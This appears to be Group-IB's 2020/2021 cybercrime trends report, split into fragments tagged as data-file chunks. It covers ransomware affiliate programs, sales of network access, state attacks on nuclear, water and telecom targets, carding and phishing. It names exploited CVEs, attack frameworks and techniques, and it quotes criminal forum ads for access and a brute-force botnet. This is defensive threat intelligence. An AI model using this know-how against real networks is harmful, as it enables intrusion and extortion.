While the overall number of successful targeted attacks on banks went down, Group-IB analysts discovered a shocking increase in the use of social engineering to commit fraud. The main attack vectors are vishing and phishing, whose victims are mainly bank customers. The fraudsters’ main goal is still to steal money and information that can be sold, but they go about it in a new way. The past year saw the majority of cybercriminal groups switch to working with ransomware. With ransomware in their arsenal, attackers are able to earn no less than they would in a successful bank attack and with a much easier technical execution. Big Game Hunting, or attacking large companies with the aim of collecting the largest possible ransom, is gaining momentum. New groups are joining the game and creating dangerous affiliations and partnerships in the cybercrime underworld.

Ransomware attacks Current threats The main goal: create access to corporate networks for ransomware purposes

Ransomware affiliate programs shape the market of corporate network access for sale

— Over the past year, seven new ransomware affiliate programs have emerged (bringing the total to 15), which has shaped the market of corporate network access for sale. — Between H2 2019 and H1 2020, the number of access for sale offers has increased 2.6-fold (from 138 to 362) compared to the previous period. — There are more and more users who actively sell access to corporate networks. In 2019, there were 50 active sellers; in the first half of 2020, Group-IB identified 63. — Owners of the banking botnets TrickBot, Qbot, Silent Night, and RTM have started using their botnets to deploy ransomware. — The cybercriminal groups Cobalt and Silence, which had previously focused on targeted attacks on banks, have presumably joined ransomware affiliate programs."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|68bf24b90f21426dba650cdd38ae60b3
— Primitive errors (such as vulnerable software versions in public services or weak passwords) pose one of the most serious risks to companies. If a vulnerable system is compromised, adversaries will usually attempt to inflict as much damage to the business as possible, followed by extortion. — Ten ransomware affiliate programs involve brute-force attacks on servers accessible externally through Remote Desktop Services. Three programs exploit vulnerabilities in VPN services. — New botnets that perform distributed brute-force attacks on remote access interfaces (RDP, SSH, VPN) and other services have been identified. — One of the most common ways that victims are tricked into paying ransoms is stealing data from the network and threatening to leak the information online. — In an effort to increase their profits, some groups have conducted auctions to sell stolen data instead of publishing it online. — Ransomware proved so popular that criminals began to publish readymade ransomware-as-a-service (RaaS) projects for Linux, MacOS, and Windows (e.g., the RAASNet project) on websites such as GitHub.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|1d671cc4e38e4b10b602ed02495395bd
— Cybercriminals have mainly used two post-exploitation frameworks to move laterally and gain control over targeted corporate networks: a free tool called Metasploit and a cracked version of Cobalt Strike. Less often, adversaries used the frameworks PoshC2 and Koadic. During the reporting period, Group-IB experts identified more than 10,000 hosts with these frameworks installed. Between H2 2018 and H1 2019, Group-IB researchers identified around 6,000 such hosts. — The countries attacked the most often were the USA, the UK, Canada, France, and Germany. They suffered 381 attacks out of 505, i.e. 75%. — The most attacked sector was manufacturing. Half of all attacks targeted entities in the manufacturing, trade, government, healthcare, construction, and academic sectors. — Group-IB identified cases of threat actors using new ransomware designed to disrupt processes associated with industrial network applications. Such tools help cybercriminals encrypt valuable data at manufacturing plants more effectively.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|c1e68e08b12b4ee382425b1b91898f5d
"— The number of ransomware affiliate programs will grow for a brief time only. Group-IB expects that the market will stabilize and that numbers will stop increasing by the end of 2020. — There may be cases of ransomware attacks targeting company mail systems. Hackers are likely to steal data from local mail servers and disable the mail system — bearing in mind that stable email communications are critical to businesses. This may lead to cloud mail services becoming more popular and the on-prem mail storage model being abandoned. — Groups that focus on attacks

on SCADA systems at industrial enterprises in order to manipulate production processes may emerge. — Intelligence services may be interested in owners of affiliate programs and use them to access networks of interest. — To inflict maximum damage on entities and divert attention away from their attacks, special services may start mimicking criminals by spreading documents that undermine the attacked organization’s business operations or by selling access to the affected corporate networks."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|b033638cc5564d5f9442a0aacbde151f
"Forecasts — Group-IB expects that specialized trading platforms will emerge for exhibiting lots with access to corporate networks, which may lead to even more related incidents. — We expect that there will be more demand for Linux malware designed to achieve persistence in the network and escalate privileges. — IoT botnet owners may start selling access to devices installed on corporate networks. — New botnets and related criminal services for distributed brute-force attacks on remote control interfaces will emerge.

High-profile attack targets include nuclear facilities in Iran and India and Israel's water supply system

— Intelligence agencies are attacking more aggressively. Their goal is now not only to spy on targets covertly but also destroy critical infrastructure facilities. — During the reporting period, seven new APT groups were identified. Group-IB also identified six known threat groups that had remained unnoticed for many years. — As part of an APT operation, adversaries shut down power units at nuclear power plants and physically destroyed the surrounding infrastructure. — A major cyberattack on a water management facility was thwarted."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|4ddfb5c8a6b442d88f85f45a6c282e73

"2.3 Tb per second and 809 million packets per second new records in DDoS attack power

— During the reporting period, six groups linked to special services actively attacked the telecommunications sector. — China is expanding its capacities in spying on mobile operators. To this end, it has developed a special Trojan for Linux servers that intercepts SMS messages based on specific criteria. — Threat actors have set new records in DDoS attack power: 2.3 Tb per second and 809 million packets per second.

— 5G networks have not been widely deployed yet, which explains why the predictions relating to associated threats that we made in our previous report have not come true. They are relevant for the next period, however. — BGP hijacking and route leaks remain a serious problem. Over the past year, nine significant cases have been publicized.

— The COVID-19 pandemic has forced a significant number of people to work from home, and many of them will become permanent work-from-home employees after the pandemic ends. As such, the number of attacks on home routers

and storage systems will continue to increase given that they help advanced crime groups and state-sponsored actors access corporate data without infiltrating an organization's perimeter."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|1b7bf2b9afae4d989c15985d8be268ce
"Forecasts — As interstate conflicts continue to escalate, it is expected that threat actors will attack telecom operators for the first time in order to cause logical network congestion, which would lead to a cascading effect and affect multiple industries.

"year. In the reporting period, however, Iran's nuclear energy facilities were sabotaged, while facilities in India were subject to espionage attacks. Threat actors are particularly interested in India because the country is developing nuclear technology and thorium-based reactors. — No new frameworks able to influence technological processes were identified in the reporting period, which suggests that threat actors have become more careful about concealing their use of such tools. — Organized crime groups have begun showing an active interest in energy companies. Targeted attacks are carried out to seize control over entire networks and infect infrastructure with ransomware.

— During the reported period, nine groups linked to intelligence services attacked the energy sector. Seven hackers reportedly sold access to energy networks. In addition, eleven successful attacks involving ransomware were conducted on the sector in question. — Many types of ransomware have been equipped with new capabilities to detect processes associated with industrial control systems, which has led to substantial losses of critical data and increased ransom amounts for recovering access to such data. This is especially true for data stored on Historian servers."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|4771dac085a3438dab371f75bda017df

Threats to the banking sector Current threats Targeted thefts are becoming rare cases relevant only for poorly protected banks

Hackers gaining access and encrypting data to obtain hefty ransoms is a trend in the banking sector

— In 2020, there have so far been no public reports on thefts through SWIFT, ATM Switch, payment gateways or ATMs when they were accessed through a bank’s network. — Nevertheless, the hacker group Lazarus reportedly continued to carry out theft attempts through SWIFT. To gain initial access, the"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|ff38214249274d65bb798024d4ac346e
"hackers used a banking botnet called Trickbot controlled by Russianspeaking cybercriminals. Moreover, Group-IB researchers detected activity by another threat group that used publicly available Trojans, keyloggers, and unmodified exploits. Such toolsets are effective only against banks with a minimum level of security. Alternatively, during incident response, security teams may have made mistakes that prevented them from identifying more sophisticated tools. — In the second half of 2019, only the group Silence carried out successful thefts without using SWIFT. They stopped attacking the financial sector in 2020, however. — The Philippine government-controlled United Coconut Planters Bank (UCPB) was robbed in September

2020. The threat actors gained access to the card processing system and changed withdrawal limits. They also gained access to InstaPay, an interbank transfer system. As a result, they siphoned 167 million pesos (USD 3.44 million) from the bank. — Tools used for attacks on ATMs have evolved slightly. During the reporting period, the following utilities were identified: ATMDtrack developed by Lazarus and a new version of the ATM Trojan developed by Silence. It has not been confirmed whether either utility has been successfully used in thefts. — Cobalt and Silence have presumably joined ransomware affiliate programs, but they have shifted their focus from banks."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|afc5f55e52cd439a909d3a5eb5147129
"— However, stealing information about financial transactions of VIP clients and publishing it online may become a more serious threat than data encryption. Such attacks may cause significant financial damage and make banks pay ransoms to threat actors more readily. — Disclosing financial transaction data could launch a series of investigative journalism cases similar to the Panama Papers case in 2015 (a massive exposure of confidential

financial files belonging to Mossack Fonseca, a Panamanian law firm), in which some intelligence agencies are likely to be interested. — Another trend may be threat actors threatening to send (fake) alerts to financial regulators notifying that a bank has security issues. Threatening to send such notifications may act as an incentive for banks to pay higher amounts to extortionists.

Forecasts — Next year, there will probably be no traditional attacks on banks for theft purposes. There may be rare incidents, but this type of activity will no longer be as widespread as it used to be. — As with other sectors, ransomware operators will pose the biggest threat to the financial vertical. This hypothesis is confirmed by the increasing number of offers selling access to corporate networks belonging to financial institutions.

156% more bank card dumps stolen using POS Trojans were offered for sale compared to the previous period

— It is possible to single out four main threats targeting retailers that may damage businesses: JS sniffers, attacks on POS terminals, credential stuffing, and ransomware. — The number of known JS sniffer families has grown from 38 to 96 compared to the previous year. — The state-sponsored threat group Lazarus has started using

JS sniffers. The threat actor uses a JS sniffer variant that automatically steals funds from Bitcoin wallets. — Techniques that prevent JS sniffers from being detected on web resources have improved greatly. — The carding market has doubled from $880 million to $1.9 billion compared to the previous year. — During the reporting period, 14 POS Trojans were found to be active. They were used to compromise and sell 63.7 million bank card dumps, which is 156% more than in the previous year. — The amount of bank card textual details offered for sale has increased from 12.5 million to 28.3 million. The largest bank card data leaks are due to US retailers being compromised."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|9d026a11f4eb4a0293bf2ca84557bed3
"— During the reporting period, 19 compromised retailer networks were identified, compared to 17 in the previous year. — Scammers primarily targeted bank cards issued in the United States, which accounts for more than 92% of all card dumps, followed by India and South Korea. — Although many vendors offer solutions for protecting against bots and attacks such as credential stuffing, threat actors continue to actively use bots without browsers, which offers opportunities to create more advanced tools for bypassing defenses as well as possibilities to develop the cybercrime market in this direction.

— Attacks on computers with connected POS terminals aimed at collecting bank card dumps will remain a major threat in the United States. — Scammers often use a fraudulent scheme as part of which they perform financial transactions in a given location, then use access to POS terminals to cancel the operations in other countries. The actions restore the card balance, and the cybercriminals can continue to perform fraudulent financial transactions. We may see similar new schemes involving access to online resources that accept card payments."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|b3f911c7016548919e4ccbb85e88d18f
"— The carding market keeps growing. However, arrests of main players may stop this growth and redistribute carding activity between criminals. — The main schemes for obtaining bank cards and the list of popular target countries are unlikely to change. — Carders may become more active in Latin America, where there is a large community of hackers with experience in using financial Trojans.

Forecasts — Many online resources are hacked every day. Currently, the main monetization methods used by hackers are selling databases and hosting phishing pages. However, damage to businesses may increase drastically, and along with it the profits made by cybercriminals if the latter begin actively cooperating with ransomware developers. — Hacker groups using JS sniffers will pose a major threat to online retailers, especially in the US. At the same time, the main business risks will be associated with fines for security violations rather than with compensation for damage to customers or reputational losses.

— Latin America, particularly Brazil, has become the main source of new banking Trojans. — Russian-speaking owners of the largest banking botnets (Trickbot, Dridex, Qbot, and Silent Night) have been following the main trend and switching to ransomware.

— A total of 19 PC banking Trojans were active this year, 12 of which were written by Russian-speaking developers. Six Trojans were developed by Latin American authors. One tool could not be attributed. — In total, 10 Android banking Trojans were active this year. Five of them are brand new.

owners are likely to be arrested, which will also reduce this threat significantly. — Every year, three to five banking botnets for PCs disappear from the market. At this rate, the market for PC banking Trojans may become

nonexistent in three to five years. A similar situation may occur with the market for Android Trojans, which are becoming less and less effective year after year.

Forecasts — Russian-speaking owners of banking botnets for both PCs and Android devices will reduce their activity even further. Eventually, such botnets will cease to exist. — As banking Trojans become more active in Latin America, some of their

"New trend:

using one

to phishing websites

— Over the period investigated, 118% more phishing resources were identified and taken down compared to the previous reporting period. — The COVID-19 pandemic has encouraged more cybercriminals

to become involved in phishing attacks, which is one of the key reasons for the above-mentioned rise. — Phishing attacks targeting bookmakers increased in Q2 2020, amounting to 6% versus 2% in the previous quarter. — Another attack type that increased by 9% was phishing used to collect accounts for various online services such as Microsoft, Netflix, Amazon, eBay, and Valve Steam. — Phishing resources targeting cryptocurrency projects have disappeared almost completely.

— So far, the main trend in 2020 is the use of one-time unique links that become inactive after the user opens them. This approach helps cybercriminals keep web phishing resources from being detected. — In Russia, the main reason for the significantly higher numbers of phishing attacks is the emergence of various affiliate programs for hackers wanting to make money off phishing related to fake bank rewards programs, lottery draws, paid surveys, etc. — Phishing-as-a-Service projects have become widespread in Russia.

— Phishing attacks have become automated and longer-lasting thanks to the emergence of scams propagated through the Phishing-as-aService model. We expect that such projects will be actively developed and distributed."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|dc3b3e3e19284327b0f815cb637e4496
"— One of the greatest challenges for the cybersecurity industry will be hackers using one-time web phishing links.

Forecasts — Phishing affiliate programs that have become more popular in Russia will be more actively used in other regions.

Gaining access to corporate networks for ransomware purposes The emergence of ransomware affiliate programs Going into 2019, many ransomware operators shifted their focus from ordinary users to companies, government agencies, and other victims that would help them pocket more money. Yet ransomware developers often lacked the tools and capabilities to infiltrate corporate networks. As a way to get around this problem, they began setting up affiliate programs. The scheme works as follows: threat actors who specialize

in penetrating corporate networks monetize their actions by distributing ransomware. After the victim pays the ransom, the ransomware authors send a cut to their affiliates.

forums. Private affiliate programs, on the other hand, are not advertised and are intended to bring together other types of threat actors (e.g. APT groups) and trusted users.

There are two types of affiliate programs: public and private. Public programs first emerged in mid-2019. Their distinctive feature is that the developers look for affiliates on underground"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|7eddf2fa6dd147f293c80281574f6722

Many affiliates prefer to keep their activities under the radar. However, analyzing their activity in the hacker community and information obtained during

incident response procedures has made it possible to identify some of them. Some users who showed an interest in affiliate programs on underground

forums were involved in either selling access or working with various malware (including stealers). Examples of access are presented below. Figure 1-2. Access for sale offers on underground forums

Access to a local network of an Indian financial institution Posted October 21, 2019 I'm selling access to the local network of an Indian financial institution. This is a mutual investment fund that belongs to a large group of companies. I will sell this access to a single customer and agree to work through an escrow service. I will provide all the proof required. All details will be provided in jabber (+OTP). Please share your contact details via PM. Please ban my account as I want to leave the forum.

Initial compromise vectors Most often, the initial intrusion vector was a malicious email campaign, a brute-force attack against Remote Desktop Protocol (RDP), or the exploitation of public-facing applications (including VPN-related).

Ransomware

Phishing

In addition, other methods of distributing ransomware included exploit kits, VPNs, botnets, and other malware (e.g., downloaders). Supply-chain attacks are extremely rare (the case of REvil). In general, the above delivery methods are also relevant for ransomware distributed without affiliate programs.

Stealing and publishing data In the early days, cybercriminals only encrypted data and demanded ransoms from victims. Since the end of 2019, however, many have started using a new technique: before encrypting all the information, they copy it to their servers for further blackmailing. They usually Figure 3.

"being stolen, the ransomware operators will publish them online. To do so they create special websites, usually in the Tor network. An example of such a website is shown below.

Attack statistics Ransomware victims include both small local companies and international giants. Over the last year, there have been reports of more than 500 successful attacks using well-known ransomware on companies in more than 45 countries. The total number

of successful attacks is much higher, but either the companies affected decided not to publicize the incident and pay the ransomware or the attack did not involve publishing data stolen from the victim's network.

The most popular targets (about 60%) were US companies. European countries accounted for only about 20% of all attacks. About 10% were countries in North and South America (excluding the USA) and Asia (7%).

TECH CRIME TRENDS 2020/2021

Maze and REvil have been the most active ransomware since late 2019, accounting for over 50% of successful attacks. Ryuk, NetWalker, DoppelPaymer are in the second tier. The most often attacked sector was manufacturing. Half of all attacks targeted entities in the manufacturing, trade, government, healthcare, construction, and academic sectors. Although they currently focus on the above industries, affiliates usually seek easier targets, which explains the wide distribution of attacks across different verticals.

Estimated damage Unfortunately, it is difficult to establish the exact damage caused by ransomware groups. This is because the amount should include the ransoms paid by victims, losses caused by system downtime, and expenses of recovering internal systems. In addition, it is difficult to obtain information about all attacks because many companies pay ransoms without making this fact public.

The table below details past ransom amounts

What’s more, the amount often varies from company to company: — For example, the ransoms demanded by the group REvil depend on the size of the company and the number of infected hosts. If only one computer on the network is infected, the ransom amount is about $48,000; but if several machines within the company's network are infected, then the average ransom amount is $470,000. There were several cases when the amount exceeded $1,000,000. The average ransom amounts to $260,000."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|2c134021a255493fa588f72010e6ac39
"— A group called Maze usually demands extremely high ransoms, i.e. beyond one million dollars. The average ransom is $2,420,000. — Some groups such as WastedLocker carried out very few attacks, but the ransom amount exceeded $10 million. — The same applies to MegaCortex ransomware. The exact number of attacks it has been involved in is unknown, but the ransoms reportedly vary from 20,000 to $5,800,000.

This means that if combined publicly known attacks and experts estimations of possible ransomware incidents, the total potential damage could exceed one billion dollars ($1,005,186,000). The data above only covers known incidents and shows the lower end of the damage. It is just the tip of the iceberg. For example, only 62 incidents involving Ryuk and spread using the banking Trojan Trickbot have been reported."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|4f062dc575054dd1b1c62221a07b8144
"According to Group-IB's statistics, however, the owners of the Trickbot botnet have successfully encrypted more than 2,500 different networks over the past year using ransomware such as Ryuk (later Conti), Kraken, and Thanos. This means that the 62 known incidents represent only 2.5 percent of all incidents. The actual damage is likely to be much greater.

As regards Dharma ransomware, its source code was put up for sale last year and could have been used by many groups. Given the circumstances, it is difficult to establish the damage caused.

Increasingly larger market for selling access to corporate networks Sales of credentials are widespread on underground forums and have taken place since the early days of such communities. For a long time, cybercriminals did not perform additional reconnaissance after finding servers and gaining access to them, nor did they understand that the compromised servers

could belong to large companies and that access to them could be capitalized on.

2018

2019

Sales of corporate network access are increasing from year to year. The peak of sales occurred in 2020, which is associated with an increase in the number

of new ransomware affiliate programs. Between H2 2019 and H1 2020, the number of access for sale offers increased 2.6-fold (from 138 to 362) compared to the previous period.

As regards the targeted sectors, in 2019 production companies remained the main victims. However, many healthcare group-ib.com

Nation-state actors sell access to networks and use ransomware In an effort to increase their profits, some state-sponsored groups began selling access to corporate networks or even using ransomware like regular cybercriminals.

A perfect example is an ad published by a user with the nickname nanash in June 2020. The seller offered access to many networks, including some belonging to US government departments, defense contractors (Airbus,

Although the message looks suspicious, further investigation revealed that its author had access to at least two companies from the list above.

"— Taiwanese authorities suspect that Chinese hackers from APT41 were behind a ransomware attack on Taiwan's energy and technology companies in May 2020. The notice included CPC Corp., a Taiwanese company that delivers petroleum products throughout the island, among the victims. While the attack did not affect CPC's manufacturing processes, it prevented customers from using CPC Corp.'s payment cards to buy gas. During the wave of attacks on Taiwanese targets, threat actors used a new ransomware called ColdLock. Malware analysis revealed similarities between the program and two known ransomware families: Freezing and EDA2, an open-source ransomware originally created for educational purposes.

In the ad, the seller specifies that the price of access to each company is 11 BTC (USD 125,000). Access is sold directly with partial prepayment: after the customer has transferred 5 BTC, the seller provides additional evidence and the second transaction occurs. In the message, the author did not mention all the companies they have access to, but the cost of accesses to companies listed explicitly is close to $5 million. Another way for state-sponsored groups to make money is to use ransomware:

"— The hacker group Lazarus has resumed developing ransomware. The fact was brought to light during attacks on European companies involving ransomware called VHD Ransomware. The hackers gained access through a vulnerable VPN gateway, obtained administrator privileges, and installed the Dacls backdoor. They moved across the victim's network and encrypted files with a combination of AES-256 in ECB mode and RSA-2048. — Another group of Chinese hackers, IronTiger, was behind the attack involving HybirdRansom ransomware against companies in the AsiaPacific region in the fall of 2019 and the spring of 2020. The ransomware has three components that consequently launch each other to lock the machine and encrypt file: Locker, Loader, and Cryptor.

Compromised hosts by time (2019-2020)

Large companies under increasing threat from massive hacks In the past, massive attacks did not cause serious damage to large companies. This was because brute-force attacks or exploiting vulnerabilities in widespread software led to their infrastructure being used to distribute or manage malicious code, mine cryptocurrencies, conduct DDoS attacks, or proxy traffic. However, the market for the sale of access to corporate networks, the number of ransomware attacks, and APT group activity have all increased, so the cost of an error on a company’s external perimeter has surged as well. Ten out of 15 ransomware affiliate programs focus on brute-force attacks on RDP. Three programs actively exploit

vulnerabilities in VPN services. APT groups performed similar actions. For example, APT29 (aka Cozy Bear) actively exploited the following vulnerabilities with public exploits: — CVE-2019-19781 (Citrix) — CVE-2019-11510 (Pulse Secure) — CVE-2018-13379 (FortiGate) — CVE-2019-9670 (Zimbra) The APT group BlackEnergy (aka Sandworm) exploited CVE-2019-10149 (a vulnerability in the Exim mail server) to install an SSH backdoor. Ordinary criminal groups carried out similar actions. For example, the group Clownz responsible for leaks"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|b0a5b9a94f384cedbca613ac5717a403
"from GoDaddy and 247.ai also used CVE‑2019-10149 (Exim) to install an SSH backdoor. For several months of activity, the group infected 80,000 servers. As mentioned above, one of the main ways to gain access to corporate networks is to conduct brute-force attacks on remote access interfaces (RDP, SSH, VPN). How effective such an attack is will determine how many companies will be compromised as a result and how much money the fraudsters will make. Another key change is the emergence of new types of botnets. Their main purpose is to help perform distributed brute-force attacks from a large number of infected devices, including servers.

Brute-force botnet After 1+ year of work, I want to announce a new distributed bruteforce/scanner. Hey friends, After one year of work, I'm happy to present a distributed brute-force scanner. The distributed scanner/ bruteforcer is a software that distributes tasks to several computers to scan/brute-force simultaneously. This speeds up the process significantly. Can the solutions be used on computers found? Yes, when using a module rootkit.

Analysis revealed that the logs contained data from a compromised machine running Windows that belonged to an employee of the Nuclear Power Corporation of India Limited (NPCIL). All the files in the archive were compiled at different times, but the main file with the compromised data is dated January 30, 2019, i.e. more than six months before they were detected.

cause evaporation of the reactor coolant, thus overheating of the reactor core.” In other words, the pressure in the steam generator, which is responsible for transferring heat from the core to the generator's turbine, was low. This could have led to the core overheating. After cybersecurity expert Puhraj Singh tweeted about the attack, the nuclear power plant's administration released a statement in which Singh's words were called “false information” and denied that an attack had occurred, stating that “any cyber-attack on the Nuclear Power Plant Control System is not possible.” The Nuclear Power Corporation of India Limited, however, later confirmed that the plant had been attacked. NPCIL’s official statement said that the malware infected one computer connected to the nuclear power plant’s administrative network, but did not reach its critical internal network used to control the power plant's nuclear reactors. South Korea, 2020 In April 2020, Lazarus sent malicious emails to a company in the energy sector in South Korea.

"KHNP is a subsidiary of Korea Electric Power Corporation. It operates large nuclear and hydroelectric plants in South Korea, which supply about 30% of the country's electric power. In addition, since October 2019, the North Korean groups Lazarus and Kimsuky have been actively attacking South Korea's defense enterprises. The attacks have intensified since April 2020. Iran, 2020 On July 3, 2020, it transpired that the Israeli authorities were suspected of carrying out a cyberattack on Iran's nuclear facilities. The incident occurred on July 2 at Iran's largest uranium-enrichment facility in Natanz and caused a fire and explosion. Before the incident was made public, a group calling itself the Homeland Cheetahs sent a statement to BBC Persian journalists and claimed to be behind the attack. The group allegedly consists of ""former members of the Iranian security forces who have decided to fight against the authorities."" Iran's officials said the incident had caused significant damage that could slow the development of advanced uranium enrichment centrifuges, but that there had been no casualties.

Attacks on Israel's water supply facilities In April 2020, the Israeli National CyberDirectorate (INCD) issued a security alert urging staff at companies in the energy and water sectors to change passwords for all Internet-connected systems. According to the alert, the agency had received reports of intrusion attempts at wastewater treatment plants, water pumping stations, and sewers, which was confirmed by the Israeli authorities. Details of the attacks were not disclosed, but INCD Head Yigal Unn said they could have led to some damage to the civilian population and even temporary water shortages. Israeli officials said that the attacks had

targeted SCADA systems of wastewater treatment facilities, but that they had been successfully thwarted. Initial reports played down the April attack, but a Financial Times report a few month later cited its sources as claiming that the hackers had gained access to some of Israel's water treatment systems and tried altering water chlorine levels before being detected and stopped. If the sabotage attack had been successful, attackers could have poisoned the local population served by the treatment facility affected. In addition, the Israeli Water Authority warned that in June 2020 water"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|81a87c6870b7484d9ecfc7eb7a7ca105
"supply and water treatment systems were attacked again. The incidents reportedly did not cause any damage to Israel’s water system. The first attack affected agricultural water pumps in upper Galilee, while the second one targeted water pumps in the central province of Mateh Yehuda, local media reported. ""These were specific, small drainage installations in the agriculture sector that were immediately and independently repaired by the locals, causing no harm or any real-world effects,"" the Water Authority said in a statement.

Attacks on Iran’s critical facilities On May 9, 2020, hackers carried out a cyberattack on the systems of Iran’s Shahid Rajaee port in the city of Bandar Abbas. According to Iran's Ministry of Roads and Urban Development officials, the attack affected a limited number of private operating resources in the port and did not cause significant damage.

It was later revealed, however, that computers regulating the flow of vessels, trucks, and goods all crashed at the same time, creating massive backups on waterways and roads leading to the facility. The attack was presumably in response to an alleged Iranian attempt to hack into Israel’s water infrastructure systems.

The attack was followed by a series of accidents and explosions at some of Iran’s critical facilities, including petrochemical plants, uranium enrichment facilities, power plants, and ports.

On June 26, a large explosion occurred near Tehran region. The Iranian government was quick to dismiss the episode as a gas explosion at the Parchin military base. Satellite photographs, however, revealed that the explosion happened at the Khodjir missile production facility (part of the Shahid Hemmat

Industrial Group). The base is laced with underground tunnels and has long been suspected of being a major site for Iran’s growing arsenal.

the organization, the attackers performed the routine process of identifying, examining and filtering sensitive valuable information from every targeted organization."|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|86bd4024752b4729937ed7a976094ede
The hacker group APT41 carried out a number of attacks recently. In February 2020, the hackers successfully exploited a Cisco RV320 router at a telecommunications organization. It is unknown what specific exploit was used, but there is a Metasploit module that combines CVE-2019-1653 and CVE-2019-1652 to enable remote code execution on such routers. It also uses wget to download specified payloads. APT41 also exploited the CVE2020-10189 vulnerability in Zoho ManageEngine, which allows unauthenticated remote attackers to execute arbitrary code with SYSTEM/root privileges. The day after CVE-2020-10189 was fixed, the threat actors attacked over a dozen systems and compromised at least five. They then deployed a trial version of the Cobalt Strike BEACON loader and used another backdoor to download VMProtected Meterpreter.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|6e4a6442accd446791bea737ac225ec2
OilRig The Iranian group OilRig has been directly involved in two campaigns affecting the telecommunications sector. One of the campaigns lasted three years and was dubbed Fox Kitten by security researchers. During the campaign, the threat actors gained access to and ensured persistence in the networks belonging to numerous companies and organizations from various sectors, including telecommunications. In most cases, target organizations were initially infected through one-day vulnerabilities in various VPN services such as Pulse Secure VPN, Fortinet VPN, and Palo Alto Networks’ Global Protect. Once inside the company, the attackers would try to maintain access to networks by opening a variety of communication tools, including opening RDP links over SSH tunneling. At the final stage, after successfully infiltrating|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|d70460bb62d14105983cc0f2e765557c
The second campaign affected telecom providers in South Asia and was discovered in April 2020. During the campaign, the threat actors used post-exploitation frameworks and tools such as Covenant, Cobalt Strike, Metasploit, and Mimikatz. In addition, the group used legitimate tools such as Plink, Bitvise, and Bitsadmin. The threat actors used phishing emails to gain initial access. The campaign’s main aim was to steal user credentials and gain access to database servers using the obtained credentials. The attacks were long-term: the threat actors may have infiltrated the network of one organization as early as in October 2019. The first activity was detected on October 11, 2019, when a malicious PowerShell command was executed to install a Cobalt Strike Beacon module. The threat actors then executed a PowerShell command that launched Metasploit for achieving persistence in the system. The group’s activities resumed on February 6, 2020, when a PowerShell command was executed to search for files similar to web.config. For each file found, the threat actors extracted username and password details where possible. They may use the credentials to access organizational resources such as SQL servers. On March 11, the threat actor attempted to connect to a database server via PowerShell, presumably using stolen credentials. The hackers also used an SQL command to obtain information about the database server version, possibly to verify credentials and connectivity.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|cd2f94af605043fcbe29133bc50d5391
Molerats Between October 2019 and early December 2019, security researchers identified multiple instances of phishing|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|f8acac2ddbd048048641ee2838c193dd
attacks likely related to a threat group called Molerats (also known as Gaza Hackers Team and Gaza Cybergang). The group targeted organizations in the telecommunications, insurance, and retail industries and government agencies, eight in total, all in six countries. All the attacks involved spear-phishing emails with malicious documents that required the recipient to carry out certain actions. The social engineering techniques involved misleading images that tricked users into enabling content to run macros. The hackers also threatened to release compromising pictures to the media as a way of coercing users into clicking a link and downloading malicious payloads. During most such attacks, the payload was a backdoor called Spark, which allows threat actors to open applications and run command line commands on the compromised system. Mikroceen Security experts analyzed a Trojan used by an unknown Chinese APT that spied on undisclosed companies in the telecommunications and gas industries as well as a government entity in Central Asia. The analysts called this campaign Mikroceen. As part of their operations, the threat group used backdoors to gain permanent access to corporate networks. Based on the data obtained, Group-IB researchers believe that the same group was involved in other attacks, including Microcin against Russian military personnel, BYEBY against the Belarussian government, and Vicious Panda against the Mongolian public sector.|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|d94263c5e55a4e3f9eaca0522ea6656c
"The group has been active since at least 2017. The experts justify this theory by the fact that the hackers used Gh0st RAT, which has been used by Chinese APTs often and for a long time. In addition, the analysts discovered clear similarities in the malware codes.

Attacks on mobile operators APT41, a Chinese state-sponsored threat group, was highly active during the investigated period. The group actively deployed malware called MESSAGETAP. The malware is designed for Linux devices and meant to be installed on Short Message Service Center (SMSC) servers located inside mobile operator networks that handle SMS communications. After compromising a cluster of Linux servers belonging to an unidentified telecom provider, the group would intercept messages

sent by individuals of interest to the Chinese government. The criminals then searched for messages based on the keyword list containing items of geopolitical interest for Chinese intelligence services. Sanitized examples include the names of political leaders, military and intelligence organizations, and political movements at odds with the Chinese government. MESSAGETAP also sets aside SMS messages if they are sent from or to particular phone numbers, or from or to a device with a particular"|data_input/Oilrig_reports/entry_b3eabc8b-db35-4481-b2d1-6ed3e0d99942.text|9873005a74aa4c229080fb1ce861f404
"International Mobile Subscriber Identity (IMSI) unique identifier. When it was discovered, the malware was tracking thousands of device phone numbers and IMSI codes at a time. During attacks, the threat actor also interacted with call detail record (CDR) databases to query, save, and steal records about individuals of interest. Targeting CDR information provides a high-level overview of phone calls between individuals, including time, duration, and phone numbers.

